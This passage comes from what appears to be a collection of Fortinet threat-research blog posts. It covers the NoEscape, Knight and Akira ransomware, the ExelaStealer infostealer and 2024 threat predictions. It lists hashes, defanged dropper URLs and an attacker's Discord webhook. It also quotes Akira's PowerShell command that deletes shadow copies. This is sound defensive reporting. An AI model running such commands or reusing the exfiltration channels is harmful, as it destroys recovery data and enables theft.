victim urging action. Some of those messages are below: Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the NoEscape ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. SHA2 Note 0073414c5a03b20f6f255f400291de67f2a7268c461f90ea6ff0355ca31af07a Windows version of NoEscape ransomware 2020cae5115b6980d6423d59492b99e6aaa945a2230b7379c2f8ae3f54e1efd5 4175dae9b268fe5b4f96055ea0376417b5ddc2518d3bd11e20f0f8255bb4621e 4d7da1654f9047b6c6a9d32564a66684407ed587cbaffa54ec1185fd73293d3e 5300d7456183c470a40267da9cd1771d6147445b203d8eb02437348bf3169e0d 53f5c2f70374696ff12adcaaf1bbbe0e5dd1b1995d98f2e876b0671888b43128 62205bf0a23e56524f2f1c44897f809457ad26bc70810008ec5486e17c7e64e2 68bce3a400721d758560273ae024f61603b8a4986440a8ec9e28305d7e6d02b0 68ff9855262b7a9c27e349c5e3bf68b2fc9f9ca32a9d2b844f2265dccd2bc0d8 73c19eab8d2ae58db3968dd7de0e745db2d7709859305b113b748bb02494465e 831a2409d45d0c7f15b7f31eddbbdfe7d58414499e81b3da7d9fdee28fafe646 8dd64ea7f226d3eb1e857b0086c0668542652cb37f8142dc000272dbd9569e31 91c515d55fae6d21b106c8c55067ce53d42bef256bd5a385cadd104cf68f64ff 9d346518330eeefbf288aeca7b2b6243bc158415c7fee3f2c19694f0e5f7d51c 10d2b5f7d8966d5baeb06971dd154dc378496f4e5faf6d33e4861cd7a26c91d7 Linux version of NoEscape ransomware 21162bbd796ad2bf9954265276bfebea8741596e8fe9d86070245d9b5f9db6da 46f1a4c77896f38a387f785b2af535f8c29d40a105b63a259d295cb14d36a561 c34c5dd4a58048d7fd164e500c014d16befa956c0bce7cae559081d57f63a243 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup,ransomware-as-a-service FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-noescape"
  },
  {
    "title": "Threat Predictions for 2024: Chained AI and CaaS Operations Give Attackers More “Easy” Buttons Than Ever",
    "content": "FortiGuard Labs Threat Research With the growth of Cybercrime-as-a-Service (CaaS) operations and the advent of generative AI, threat actors have more “easy” buttons at their fingertips to assist with carrying out attacks than ever before. By relying on the growing capabilities in their respective toolboxes, adversaries will increase the sophistication of their activities. They’ll launch more targeted and stealthier hacks designed to evade robust security controls, as well as become more agile by making each tactic in the attack cycle more efficient. In our2024 threat predictions report, our FortiGuard Labs team looks at a new era of advanced cybercrime, examines how AI is changing the (attack) game, shares fresh threat trends to watch for this year and beyond, and offers advice on how organizations everywhere can enhance their collective resilience against an evolving threat landscape. We've been observing and discussing many fan-favorite attack tactics for years and covered these topicsin past reports. The \"classics\" aren't going away—instead, they're evolving and advancing as attackers gain access to new resources. For example, when it comes to advanced persistent cybercrime, we anticipate more activity among a growing number of advanced persistent threat (APT) groups. In addition to the evolution of APT operations, we predict that cybercrime groups, in general, will diversify their targets and playbooks, focusing on more sophisticated and disruptive attacks, and setting their sights on denial of service and extortion. Cybercrime \"turf wars\" continue, with multiple attack groups homing in on the same targets and deploying ransomware variants, often within 24 hours or less. In fact, we’ve observed such a rise in this type of activity that the FBIissued a warningto organizations about it earlier this year. And let’s not forget about the evolution of generative AI. This weaponization of AI is adding fuel to an already raging fire, giving attackers an easy means of enhancing many stages of their attacks. As we’ve predicted in the past, we’re seeing cybercriminals increasingly use AI to support malicious activities in new ways, ranging from thwarting the detection of social engineering tomimicking human behavior. While cybercriminals will always rely on tried-and-true tactics and techniques to achieve a quick payday, today’s attackers now have a growing number of tools available to them to assist with attack execution. As cybercrime evolves, we anticipate seeing several fresh trends emerge in 2024 and beyond. Here’s a glimpse of what we expect. Next-level playbooks:Over the past few years, ransomware attacks worldwide have skyrocketed, making every organization, regardless of size or industry, a target. Yet, as an increasing number of cybercriminals launch ransomware attacks to attain a lucrative payday, cybercrime groups are quickly exhausting smaller, easier-to-hack targets. Looking ahead, we predict attackers will take a \"go big or go home\" approach, with adversaries turning their focus to critical industries—such as healthcare, finance, transportation, and utilities—that if hacked, would have a sizeable adverse impact on society and make for a more substantial payday for the attacker. They’ll also expand their playbooks, making their activities more personal, aggressive, and destructive in nature. It's a new day for zero days:As organizations expand the number of platforms, applications, and technologies they rely on for daily business operations, cybercriminals have unique opportunities to uncover and exploit software vulnerabilities. We've observed arecord numberof zero days and new Common Vulnerabilities and Exposures (CVEs) emerge in 2023, and that count is still rising. Given how valuable zero days can be for attackers, we expect to see zero-day brokers—cybercrime groups selling zero days on the dark web to multiple buyers—emerge among the CaaS community. N-days will continue to pose significant risks for organizations as well. Playing the inside game:Many organizations are leveling up their security controls and adopting new technologies and processes to strengthen their defenses. These enhanced controls make it more difficult for attackers to infiltrate a network externally, so cybercriminals must find new ways to reach their targets. Given this shift, we predict that attackers will continue to shift left with their tactics, reconnaissance, and weaponization, with groups beginning to recruit from inside target organizations for initial access purposes. Ushering in “we the people” attacks:Looking ahead, we expect to see attackers take advantage of more geopolitical happenings and event-driven opportunities, such as the 2024 U.S. elections and the Paris 2024 games. While adversaries have always targeted major events, cybercriminals now have new tools at their disposal—generative AI in particular—to support their activities. Narrowing the TTP playing field:Attackers will inevitably continue to expand the collection of tactics, techniques, and procedures (TTPs) they use to compromise their targets. Yet defenders can gain an advantage by finding ways to disrupt those activities. While most of the day-to-day work done by cybersecurity defenders is related to blocking indicators of compromise, there's great value in taking a closer look at the TTPs attackers regularly use, which will help narrow the playing field and find potential “choke points on the chess board.” Making space for more 5G attacks:With access to an ever-increasing array of connected technologies, cybercriminals will inevitably find new opportunities for compromise. With more devices coming online every day, we anticipate that cybercriminals will take greater advantage of connected attacks in the future. A successful attack against 5G infrastructure could easily disrupt critical industries such as oil and gas, transportation, public safety, finance, and healthcare. Cybercrime impacts everyone, and the ramifications of a breach are often far-reaching. However, threat actors don't have to have the upper hand. Our security community can take many actions to better anticipate cybercriminals' next moves and disrupt their activities:collaboratingacross the public and private sectors to share threat intelligence, adopting standardized measures for incident reporting, and more. Organizations also have a vital role to play in disrupting cybercrime. This starts with creating a culture of cyber resilience—making cybersecurity everyone’s job—by implementing ongoing initiatives such as enterprisewide cybersecurity education programs and more focused activities like tabletop exercises for executives. Finding ways to shrink the cybersecurity skills gap, such as tapping intonew talent poolsto fill open roles, can help enterprises navigate the combination of overworked IT and security staff as well as the growing threat landscape. And threat sharing will only become more important in the future, as this will help enable the quick mobilization of protections. Download a copy of ourfull predictions reportfor 2024. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard Security Subscriptions and Servicesportfolio.Sign up for FortiGuard Outbreak Alertsto stay up to speed on the latest breaking threats. Learn more about Fortinet’sfree cybersecurity training, an initiative of Fortinet’s Training Advancement Agenda, or about the FortinetNetwork Security Expert program,Academic Partner program, andVeterans program. threat predictions,CaaS FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/2024-threat-predictions-chained-ai-and-caas-operations"
  },
  {
    "title": "Ransomware Roundup - Knight",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Knight ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Knight is a relatively new ransomware group that arrived in August 2023. Like many attackers, the gang behind this variant employs double extortion tactics, where the Knight ransomware encrypts files on victims’ machines and exfiltrates data for extortion purposes. The predecessor of Knight, Cyclops, had multi-OS tools for Windows, Linux, and Mac OS. So, while FortiGuard Labs had only located a Windows version of the Knight ransomware at the time of our investigation, it seems likely that other versions may be on the way. According to anadvisoryby CERT Italy in early September, Knight targeted Italian organizations with phishing campaigns using emails with malicious attachments. The same was reported in early August by security researcher@felixw3000. In addition, Remcos and Qakbot malware are known to deliver the Knight ransomware to compromised machines. According to data collected through Fortinet'sFortiRecon service, the Knight ransomware group has targeted multiple industry verticals. While Retail was most affected by the Knight ransomware, the group also victimized organizations in healthcare, including hospitals, physicians’ clinics, and dental offices, indicating that the threat actor has no reservations about impacting people who need medical care. When classifying victim organizations by country, the United States is in first place by a significant margin. As of October 20, 2023, the Knight ransomware group had last posted new victims on October 18th. Once a network has been compromised and data has been exfiltrated, files encrypted by the Knight ransomware are appended with a “.knight_l” file extension. It then drops a ransom note labeled, “How To Restore Your Files.txt.” Because the Knight ransomware targets enterprises, the ransom fee is set at a relatively high price. However, the Bitcoin wallet in this ransom note had no recorded transactions at the time of our investigation. The Knight ransomware group owns a TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. The group also uses another TOR site for disclosing stolen data and has abused several publicly available file-sharing services, such as Mega, Gofile, and UploadNow. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Knight ransomware samples with the following AV signature: FortiGuard Labs detects the known Knight ransomware droppers with the following AV signature: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Known hosting sites of the Knight ransomware droppers are blocked by the Web filtering client. SHA2 Note 1112d8346ee413ac8aecaf5bc0dc5400041669116a5a596c6be2e24c6886849d Knight ransomware 2bfababf54992c32afced15b355cf7fcf7c6b0783cfee9086e80893d5f5124ed 3ed381014d25a9796bd6d007573b2abe152ee455738ae5f2288e5146726f3b2e 3f029aee12d43e3c67c4ab07c43bcd0960fa9f6a371f40577004673ac95e870c 40c6896d761595fe190e0fa891462bfb120579b6399bd28f40839c017a367538 4416ba60d11b0e8eafa07f3c3051c2d84ffcb5c860d458b6a1374fdc935e92f2 484414d68e1c3e79e602ed2876e963161916e21ea4e2c920da5cc623ea19731f 50ce3d6e410f0f83c9407a572eb29733084fed94f5dacff59cea350bcccee27d 581c6c58e6ea187e74bc23d8d0fa9feb7dc5cc2db4ca887afee5be229532e8e2 5ec48925f73ea58a27d6306d23d76b5da41e16754f58f26098ed36f0d1f198c8 6ff69b6e0f778aabf521a72a70c34274acfabc59a3472f7cba2372ebb8875d0f 70d2891a1cb3b6172428ea9cdb5a81b0494deac02b7dee91527a17fb9f53509a 712fc089cb028e381e285685519df357fb4102f8bc8de31547a9b98ca7629e49 7b4d227fddcc4e93ea0cdf017026ff2dad6efd6bc7de71b689dc0595a2a4fb4d 7f99540993e2afc351776b85ea22661d3701743521d55d657abdb23e12c93c00 a6258d70bc0b5d5c87368c5024d3f23585790b14227b8c59333413082524a956 b586d60beb49b362d4cd9b8d64fc9a3eef3da76b0f494c42c4ac30d6612d8993 b5deec95d1f50229e1361ca47761b9742006f484cf1f2c31ba8a495afb814ae2 cb41bbbe053e7a9b4857bf89c92298e7c0abdf9da157185fcfec5b383fe1e62c cd92bf9c3349b086eec621de247bbb1bceebffb90863a46496c3b41fb13ec745 ce609604f4deb265ed957540b86ba96b33d26399c8d508110d78b0602f9d9d3a d256bb30d0609d0e3aa7f1b98077dda6136f2f3604beb71ec982d8125d2858ed e2af95e7827144a9278fcbb87fe8d9a4cfdb8f69b2f43f63c9e26aa6a33cc2ed e5f1f8f5b2b4304493f416b54324c0b0e0253ed07ee1f4512bbe184e32e4580a ecafd694118c4bcd21b4f7a620ed8a1346932f05acefe8cd32a01febec9a92d9 fba8fee602b5c3db46cbbb45ff2f8aa72791f47f8b8c6a556334d3d3358cebba 1341bd6193ea223c05566aaca13fc1152732b67af8344519d6efaaf9ab6ed5f4 Knight ransomware dropper 14ab9dc515dc22f0bbf5f3e44cc280e35331bf9209b6c4d35b86bfe3f32bcd23 167678eb9daa2376bd805069fac69c42b0ad0c6f70b9d644161970c1770c117f 3bd52cefc9d88c5292275729ca096c131a5db8c77ec142493a066623270cb782 3fbedfb9ae1e9bcef7983491124e3a50937f9c5209b7cfc2614197a2e8045cfb 4f1e46ac9e46f019d3be3173f0541f5ed07bde6389180cd7e8255d35b49f812e 554990b8636baf5af393d52ce85150a8b263b9c5fb214bc0e69a1b032ee8f3ae 5ace35adeb360b9e165e7c55065d12f192a3ec0ca601dd73b332bd8cd68d51fe 5c0f3de1254bcad7f457ad1898df2fdbe44dc964b5e92fba125c19888481da75 5ed4dfb7da504438688d779092a717cb2426ee88bc4f0ee588b3e989b7567dff 61bb91bc554d9b849cbd670669365bc5a58a8c5f9a0f530b8ed9a4b8f0968186 716341671eff8ca18c5f5bbf38095d07225141d02854168f854b168731b4c71c 75e227a3a41dc1c2d4384e877d88f9a06437a49f2c71f8efa7e2cc60bab6cc4a 7ec0d3e3dc4222f34c482926ce1f971b51929e95b9d097140bc1f4b1c84dafd9 9123e42cdd3421e8f276ac711988fb8a8929172fa76674ec4de230e6d528d09a a2c654357d790d7c4cec619de951649db31ecdb63935f38b11bb37f983ff58de b6064f6936f72d1312f40f86f0cb889c6d0477c20f59c6c96c385c6287f701f7 bb65532e8a52e282d98938031c0d75155082933524924d01de4246e12690cf9c c42ad519510936f14ab46fbad53606db8132ea52a11e3fc8d111fbccc7d9ab5a dbf9cc65461c7bc650938156d3751d4ae0ce4312d3899f747e590767c0ef0408 eedda61d02d8bd0e145a07e6048621fc84f420376e6cda2616c2d77d4fd4fe18 f2571431c9d8e87081816d46cda9bde8d98b081056fdc2114e88cbad2d544cec URL Note hxxp://89.23.96.203/333/1[.]exe Knight ransomware dropper location Knight ransomware dropper location hxxp://89.23.96.203/333/2[.]exe hxxp://89.23.96.203/333/3[.]exe hxxp://89.23.96.203/333/4[.]exe hxxp://89.23.96.203/333/6[.]exe hxxp://89.23.96.203/333/7[.]exe hxxp://89.23.96.203/333/8[.]exe hxxp://89.23.96.203/333/9[.]exe hxxp://89.23.96.203/333/92[.]exe hxxp://89.23.96.203/333/10[.]exe hxxp://89.23.96.203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es[.]exe hxxp://89.23.96.203/333/xwenxub285p83ecrzvft[.]exe hxxp://89.23.96.203/333/TmsLA6kdcU8jxKzpMvbUVweTeF5YcR[.]exe hxxp://89.23.96.203/333/cv4TCGxUjvS[.]exe Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup,extortion FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-knight"
  },
  {
    "title": "Another InfoStealer Enters the Field, ExelaStealer",
    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:The information collected can be used for future attacksSeverity Level:Medium In 2023, the InfoStealer market is a reasonably crowded affair. The likes of RedLine, Raccoon, and Vidar own a significant market share, with new entrants such as SaphireStealer appearing frequently. The latest entry, ExelaStealer has now taken the field. Very little backstory is available on ExelaStealer, with the earliest public mentions FortiGuard Labs could locate occurring in August 2023. FortiGuard Labs research reveals that ExelaStealer is a largely open-source InfoStealer with paid customizations available from the threat actor. It is written in Python, although it pulls resources from other languages (e.g., JavaScript) where needed. It can steal sensitive information from a Windows-based host (e.g., passwords, credit cards, cookies and session data, and general keylogging). FortiGuard Labs was able to obtain a sample. This blog will analyze its inner workings. Advertising on the Dark Web for ExelaStealer offers both an open-source and paid-for version. These advertisements also provide good insight into its capabilities. Some ads appear to have been posted by the prime contact for ExelaStealer, an individual or group using the handle “quicaxd.” As shown in Figure 2, the cost for a month of use is $20, while three months is $45. A lifetime subscription is $120. Additionally, its Telegram channel is shown, which was active at the time of writing. Its Telegram home allows individuals to purchase a copy of the paid-for version and the GitHub repo for the open-source version. Anyone with the necessary skills could create an ExelaStealer binary using the freely available source code. The malware can currently only be compiled and packaged on a Windows-based host. The primary code for the malware is contained in a file named “Exela.py.” The build process is initiated using a batch file that then calls Python and the “builder.py” file. The builder uses a file named “obf.py” to make the calls necessary to obfuscate ExelaStealer’s code, making it harder to analyze. The non-library and now obfuscated code is distilled into a file named “Obfuscated.py,” which is ready for use. The binaries analyzed by FortiGuard Labs appeared to have been released as part of a specific campaign. The use of a decoy document supports this. Unfortunately, the initial infection vector was not available to us. However, initial infection could be achieved in any number of ways (e.g., phishing, watering holes, other malware, etc.). This binary acts as a container and first stage for the deployment. Its job is the spawning of the “sirket-ruhsat-pdf.exe”  (95d860570b2777d7af213f9b48747d528251facada54842d7a07a5798fcbfe51) executable and launching a PDF viewer to display a decoy document (BNG 824 ruhsat.pdf) to the user. It will deposit both files into the root of the C: Drive. “sirket-ruhsat-pdf.exe” automatically attempts to find a compatible viewer and launch “BNG 824 ruhsat.pdf”. The PDF is a copy of a Turkish vehicle registration certificate for a Dacia Duster. The document is entirely benign and simply a visual decoy to the user. “sirket-ruhsat-pdf.exe” is a PyInstaller executable. As such, a tool such as “pyinstxtractor” (https://github.com/extremecoders-re/pyinstxtractor) can extract the archive's contents for inspection. The executable is most likely signed with a fraudulent or invalid certificate and uses the name “Runtime Broker,” a legitimate Microsoft process. Figure 10 shows the compiled version of the “Obfuscated.py” file. Using another tool, such as “pycdc” (Python Byte-code Disassembler/Decompiler - https://github.com/zrax/pycdc), the code in “Obfuscated.pyc” can be decompiled. Unfortunately, as good as its word, function names and variable values in the file are heavily obfuscated, increasing the time required to analyze it statically. That does not make it impossible, however. A large blob of data in the code looks out of place compared to the rest of the instructions. Functions at the end of the file allow for its decoding and execution. By taking those functions and depositing them with the blob into a test script, we can obtain the full decoded contents for review. Figure 14 shows the final output, which you’ll note is the code for “Exela.py.” except in this case, it is being used in the wild. Turning our attention to dynamic analysis, the first activity that “sirket-ruhsat-pdf.exe” will complete is spawning itself in a new process. ExelaStealer then runs the following two commands: These collect the version of Windows and the host’s UUID (Universally Unique Identifier). What follows next is a base-64 encoded PowerShell command. Decoded, this command attempts to grab a screenshot of whatever is currently displayed on the screen. A flurry of both PowerShell and command-line items then follows: These commands copy images from the Clipboard and gather basic system information, basic physical disk information, user information, firewall status, and, interestingly, WLAN status and profile. To store this information locally before sending it back to the TA, a folder is created in “C:\\Users\\<user>\\AppData\\Local\\Temp\\” and named using the UUID of the host. Each text file contains a URL back to the Telegram channel of the TA. The files are packaged into a Zip archive using the same name as the folder (the UUID). This is then sent using a Discord webhook (https://discord.com/developers/docs/resources/webhook) to post to a TA-controlled Discord channel. Data has become a valuable currency, and because of this, attempts to gather it will likely never cease. InfoStealer malware exfiltrates data belonging to corporations and individuals that can be used for blackmail, espionage, or ransom. Despite the number of infostealers in the wild, ExelaStealer shows there is still room for new players to emerge and gain traction. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. Filename SHA256 sirket-ruhsat-pdf.exe f96bc306a0e3bc63092a04475dd4a1bac75224df242fa9fca36388a1978ce048 sirket-ruhsat-pdf.exe 95d860570b2777d7af213f9b48747d528251facada54842d7a07a5798fcbfe51 BNG 824 ruhsat.pdf 5aff2c5e65d8e4e7fa0b0c310fbaef1e1da351de34fa5f1b83bfe17eeabac7ef RuntimeBroker.exe 34dca3c80cd5125091e6e4de02e86dcc6a2a6f9900e058111e457c9bce6117c0 RuntimeBroker.exe c56b23602949597352d99aff03411d620b7a5996da2cab91368de275dcfbaa44 IOC IOC type hXXps://discord[.]com/api/webhooks/1139506512302194789/X_VYZdAHscWQNKWvya9KWqqqTK6UjVvS86_kUy8P8OyCcPhKykCQpEqf93S_qDFVuzp8 Discord webhook address infostealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/exelastealer-infostealer-enters-the-field"
  },
  {
    "title": "Ransomware Roundup - Akira",
    "content": "FortiGuard Labs Threat Research Update 4/24/24 – The latest CISA Advisory#StopRansomware: Akira Ransomware | CISAcontains contributions from Fortinet and other industry partners. On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Akira ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows and Linux UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Akira is a relatively new ransomware variant with Windows and Linux versions that came out in April 2023. Like many attackers, the gang behind this variant only uses the ransomware to encrypt files after first breaking into a network and stealing data. This group also employs a double extortion tactic, demanding a ransom from victims in exchange for file decryption and not leaking stolen information to the public. According to anadvisoryissued by CERT India, Akira typically targets organizations running a VPN (virtual private network) service without multi-factor authentication configured. Purchasing network access from the initial access brokers is another possibility. According to data collected through Fortinet'sFortiRecon service, the Akira ransomware group has targeted various industry sectors. While Manufacturing is its most targeted sector, it only leads the second-ranked sector, Business Services, by 2%. Other industry sectors are mostly evenly targeted, which indicates that the Akira ransomware group victimized any organizations they found vulnerable. When victim organizations are classified by country, the United States is in first place by a significant margin. As of September 22, 2023, the Akira ransomware group had last posted new victims on September 18th. Once a network has been compromised and data has been exfiltrated, the ransomware group will deploy the Windows version of the Akira ransomware to machines running the Windows operating system. The ransomware looks for and encrypts files on those machines. However, it skips the following file extensions for file encryption: The following directories are also excluded from file encryption: The Akira ransomware offers a few command-line options for attackers when executing: The ransomware adds a “.akira” extension to encrypted files. It then drops the following ransom note, labeled \" akira_readme.txt,\" in every folder where files are encrypted. It also runs the following PowerShell command to delete Shadow Copies, which makes file recovery difficult. powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\" The Linux version of the Akira ransomware targets files with the following extensions for encryption: \".4dd\", \".4d\", \".accdb\", \".accdc\", \".accde\", \".accdr\", \".accdt\", \".accft\", \".adb\", \".ade\", \".adf\", \".adp\", \".arc\", \".ora\", \".alf\", \".ask\", \".btr\", \".bdf\", \".cat\", \".cdb\", \".ckp\", \".cma\", \".cpd\", \".dacpac\", \".dad\", \".dadiagrams\", \".daschema\", \".db\", \".db-shm\", \".db-wa\", \".db3\", \".dbc\", \".dbf\", \".dbs\", \".dbt\", \".dbv\", \".dbx\", \".dcb\", \".dct\", \".dcx\", \".dd\", \".dlis\", \".dp1\", \".dqy\", \".dsk\", \".dsn\", \".dtsx\", \".dx\", \".eco\", \".ecx\", \".edb\", \".epim\", \".exb\", \".fcd\", \".fdb\", \".fic\", \".fmp\", \".fmp12\", \".fmps\", \".fo\", \".fp3\", \".fp4\", \".fp5\", \".fp7\", \".fpt\", \".frm\", \".gdb\", \".grdb\", \".gwi\", \".hdb\", \".his\", \".ib\", \".idb\", \".ihx\", \".itdb\", \".itw\", \".jet\", \".jtx\", \".kdb\", \".kexi\", \".kexic\", \".kexis\", \".lgc\", \".lwx\", \".maf\", \".maq\", \".mar\", \".mas\", \".mav\", \".mdb\", \".mdf\", \".mpd\", \".mrg\", \".mud\", \".mwb\", \".myd\", \".ndf\", \".nnt\", \".nrmlib\", \".ns2\", \".ns3\", \".ns4\", \".nsf\", \".nv\", \".nv2\", \".nwdb\", \".nyf\", \".odb\", \".oqy\", \".orx\", \".owc\", \".p96\", \".p97\", \".pan\", \".pdb\", \".pdm\", \".pnz\", \".qry\", \".qvd\", \".rbf\", \".rctd\", \".rod\", \".rodx\", \".rpd\", \".rsd\", \".sas7bdat\", \".sbf\", \".scx\", \".sdb\", \".sdc\", \".sdf\", \".sis\", \".spq\", \".sq\", \".sqlite\", \".sqlite3\", \".sqlitedb\", \".te\", \".temx\", \".tmd\", \".tps\", \".trc\", \".trm\", \".udb\", \".ud\", \".usr\", \".v12\", \".vis\", \".vpd\", \".vvv\", \".wdb\", \".wmdb\", \".wrk\", \".xdb\", \".xld\", \".xmlff\", \".abcddb\", \".abs\", \".abx\", \".accdw\", \".adn\", \".db2\", \".fm5\", \".hjt\", \".icg\", \".icr\", \".lut\", \".maw\", \".mdn\", \".mdt\", \".vdi\", \".vhd\", \".vmdk\", \".pvm\", \".vmem\", \".vmsn\", \".vmsd\", \".nvram\", \".vmx\", \".raw\", \".qcow2\", \".subvo\", \".bin\", \".vsv\", \".avhd\", \".vmrs\", \".vhdx\", \".avdx\", \".vmcx\", \".iso\" The Linux variant of Akira also uses various symmetric key algorithms for file encryption, including AES, CAMELLIA, DES, and IDEA. One notable thing about the Linux version is that it excludes the same file extensions and directories from file encryption as the Windows version. This indicates that the attacker has ported the Windows version to Linux. It also drops the same ransom note as the Windows version: The Akira ransomware group owns its own TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. Unlike the TOR sites used by other ransomware groups, Akira’s TOR site accepts commands and displays results. For example, executing the “leaks” command will bring up links to the stolen data and the 